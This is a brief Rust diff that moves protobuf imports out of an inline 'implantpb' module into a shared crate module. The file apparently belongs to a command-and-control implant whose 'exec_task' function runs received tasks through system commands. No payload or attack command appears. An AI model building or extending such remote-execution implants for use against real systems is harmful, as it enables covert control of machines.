@@ -1,9 +1,4 @@
-pub mod implantpb {
-    tonic::include_proto!("implantpb");
-}
-
-use implantpb::task_response::TaskPayload;
-use implantpb::{TaskResponse, TaskType};
+use crate::pb::{TaskResponse, TaskType, task_response::TaskPayload};
 use std::process::Command;
 
 pub fn exec_task(response: &TaskResponse) -> Option<(Vec<u8>, Vec<u8>)> {
